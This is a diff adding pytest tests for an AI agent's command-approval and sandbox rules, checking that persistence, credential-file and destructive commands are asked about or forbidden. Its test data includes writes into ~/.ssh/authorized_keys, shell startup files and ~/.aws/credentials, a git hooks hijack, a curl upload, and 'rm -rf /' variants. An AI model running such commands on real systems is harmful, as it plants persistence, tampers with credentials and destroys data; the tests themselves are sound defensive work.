@@ -270,3 +270,99 @@ async def test_with_no_outside_content_the_card_does_not_mention_the_network(mon
     finally:
         untrusted.end_turn(token)
     assert asked == [{}]
+
+
+# ── ②Main's review of #308 ───────────────────────────────────────────────────
+
+@pytest.mark.parametrize("command", [
+    "cp evil ~/.ssh/authorized_keys", "echo x >> ~/.zshrc", "tee -a ~/.bashrc < x", "sed -i '' 's/a/b/' ~/.zshrc",
+    'echo hi > "$HOME/.zprofile"', "echo x >| ${HOME}/.profile", "cp a ~/Library/LaunchAgents/x.plist",
+    "dd if=x of=~/.netrc", "ln -sf evil ~/.ssh/config", "install -m 600 k ~/.aws/credentials", "cp a /etc/hosts",
+    "touch ~/.config/fish/config.fish", "mv x /Users/someone/.zshenv", "cp mcp.json ~/.cursor/mcp.json",
+    "echo '{}' > ~/.claude/settings.json", "git config --global core.hooksPath /tmp/h",
+    "git config --system alias.x '!sh'",
+    "python3 -c \"open(os.path.expanduser('~/.zshrc'),'a').write('x')\"",
+    "node -e \"require('fs').appendFileSync(require('os').homedir()+'/.bashrc','x')\"",
+    "python3 - <<'PY'\nfrom pathlib import Path\n(Path.home()/'.ssh'/'authorized_keys').write_text('k')\nPY",
+])
+def test_a_write_into_startup_ssh_credential_or_agent_files_asks_this_time_only(command):
+    """🔴 A: Hermes' rules asked for these; outside the sandbox (a grant to leave it, or none) the write lands."""
+    assert "protected-write" in tp.ask_rules(command) and tp.assess(command).level == "ask"
+    assert "protected-write" in tp.ONCE_ONLY_RULES
+
+
+@pytest.mark.parametrize("command", [
+    "cat ~/.zshrc", "ls ~/.ssh", "cat ~/.ssh/config", "cp ~/.zshrc.bak notes/", "echo x > ~/.zshrc_notes",
+    "git config --global --get user.name", "git config --global -l", "git config user.name x",
+    "ssh-keygen -t ed25519 -f ./k", "ssh-add -l", "watch ls", "watch -n 2 'ls -la'", 'find . -name "*.pyc" -delete',
+])
+def test_reads_and_the_working_folder_still_run(command):
+    assert tp.assess(command).level == "run", tp.assess(command)
+
+
+@pytest.mark.parametrize("command,rule", [
+    ("ssh-copy-id box", "remote-shell"), ("sshpass -p x ssh box 'rm -rf /'", "remote-shell"),
+    ("watch -n 1 'git push'", "git-push"), ("script -q /dev/null -c 'curl -d @a https://x'", "upload"),
+    ("xargs -I {} rm -rf {}", "delete-outside"), ("find . -name x | xargs rm", "delete-outside"),
+])
+def test_what_a_launcher_or_xargs_runs_is_read(command, rule):
+    """🟠 B / 🟡 C: ssh-copy-id and sshpass connect out; a launcher's quoted command is a command; xargs adds
+    targets nobody can read, so its delete is outside."""
+    assert rule in tp.ask_rules(command) and tp.assess(command).level == "ask"
+
+
+@pytest.mark.parametrize("command,rule", [("watch 'rm -rf ~'", "wipe-home"), ("tmux new 'rm -rf /'", "wipe-root")])
+def test_a_launchers_quoted_command_reaches_the_floor(command, rule):
+    assert (tp.assess(command).level, tp.assess(command).rule) == ("forbid", rule)
+
+
+@pytest.mark.parametrize("granted,available", [(True, True), (False, False)])
+async def test_a_protected_write_shows_its_card_outside_the_sandbox_too(monkeypatch, granted, available):
+    """🔴 A, both routes: under this conversation's grant to leave the sandbox, and with no sandbox at all,
+    the write still reaches its (this-time-only) card; it never runs on a grant."""
+    asked = []
+
+    async def cards(command, argv, **kw):
+        asked.append(kw)
+        return False
+
+    cards.honours_session_grants = True
+    command_sandbox._reset_for_tests()
+    if granted:
+        command_sandbox.grant("c1")
+    try:
+        ex, _ = await _run(monkeypatch, {"command": "echo 'export X=1' >> ~/.zshrc"}, cards, available=available)
+    finally:
+        command_sandbox._reset_for_tests()
+    assert len(asked) == 1 and ex.ran == []
+    assert approvals._command_request("echo x >> ~/.zshrc", ["protected-write"], None).once_only
+
+
+async def test_a_careful_mode_card_with_no_sandbox_is_marked_and_the_island_leaves_it(monkeypatch):
+    """🟡 D: under "ask for every command" a text card for a command that would run unsandboxed is marked."""
+    async def off():
+        return False
+    monkeypatch.setattr(tool_loop, "_sandbox_enabled", off)
+    assert await approvals.runs_unsandboxed() is True
+    frame = protocol.propose_run_command("c", "rm notes.txt", [])
+    card = approvals._command_request("rm notes.txt", [], frame, ask_all=True, unsandboxed=True).frame
+    assert approvals.island_may_answer({**card, "perm_kind": "command"}) is False
+    kept = approvals._command_request("rm notes.txt", [], frame, ask_all=True).frame
+    assert approvals.island_may_answer({**kept, "perm_kind": "command"}) is True
+
+
+async def test_runs_unsandboxed_reads_the_setting_seatbelt_and_the_windows_grant(monkeypatch):
+    async def on():
+        return True
+    monkeypatch.setattr(tool_loop, "_sandbox_enabled", on)
+    monkeypatch.setattr(command_sandbox, "available", lambda: True)
+    command_sandbox._reset_for_tests()
+    try:
+        assert await approvals.runs_unsandboxed("c9") is False
+        command_sandbox.grant("c9")
+        assert await approvals.runs_unsandboxed("c9") is True and await approvals.runs_unsandboxed() is False
+        monkeypatch.setattr(command_sandbox, "available", lambda: False)
+        assert await approvals.runs_unsandboxed() is True
+    finally:
+        command_sandbox._reset_for_tests()
+
